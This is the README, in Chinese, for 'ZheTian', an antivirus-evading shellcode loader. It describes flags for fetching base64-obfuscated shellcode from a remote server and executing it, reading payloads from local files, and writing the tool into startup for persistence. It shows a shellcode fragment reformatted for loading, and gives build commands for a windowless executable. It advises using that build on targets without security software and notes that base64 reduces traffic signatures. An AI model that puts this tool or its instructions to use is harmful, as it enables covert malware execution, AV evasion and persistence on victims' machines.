![my-logo.png](https://raw.githubusercontent.com/yqcs/ZheTian/master/images/logo.png "my-logo")

# [ZheTian](https://github.com/yqcs/ZheTian/)

### ZheTian Powerful remote load and execute ShellCode tool

# 免杀shellcode加载框架

### 命令详解

> -u：从远程服务器加载base64混淆后的字节码。
> -r：从本地文件内读。
> -s：读取无修改的原始文件，只能从本地加载
> > -o：参数为tru自动向启动项添加自启模块。

从http远程服务器或本地文件内读取shellcode字节码需遵循以下格式：
` java类型需去除0x，c or python 类型需去除\x `

## 示例：

### 字节码类型：

原始python代码：
> buf = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b"....

修改成：
> fc4883e4f0e8c8000000415141......
>
Java、c、ruby等同理。只需将字节数组里的16进制代码提取出来即可。注意需将得到的字符串使用base64转码。

### 原文件读取类型：

使用 `ZheTian -h `命令可查看支持的语言。原文件无需使用base64转码，但是不支持放在远程服务器，只能通过本地 -s 命令读取，如： `ZheTian -s C:/Windows/Temp/payload.java`

### 编译：

> go build -ldflags "-w -s"  main.go

可以使用
> go build -ldflags "-w -s -H windowsgui" main.go

实现无窗口运行。但是360偶尔会识别为恶意程序。如果目标机器无安全设备，可以尝试使用此命令打包，然后使用参数： ` -o true` 实现写入启动项功能。

#### 带图标编译：

> 先执行：go get github.com/akavel/rsrc
>
> rsrc -manifest ZheTian.manifest -ico favicon.ico -o ZheTian.syso
>
>再执行go build -ldflags "-w -s" -o ZheTian.exe
>
> 更多介绍：https://blog.csdn.net/qq_38376348/article/details/108318880
>
![my-logo.png](https://raw.githubusercontent.com/yqcs/ZheTian/master/images/1.png "my-logo")

### 注意：打包的时候需指定是64位还是32位。默认会根据系统自动选择。 而在生成payload shellcode的时候也需要选择正确的位数，否则会加载失败。使用code字节码加载时一定要使用base64加密，否则无法解析！！

后端使用了base64对读取到的字节码进行了转码，为了减小流量特征。AES/DES的加密模式太多在未标明的情况下可能导致无法解密失败，故此暂不考虑使用

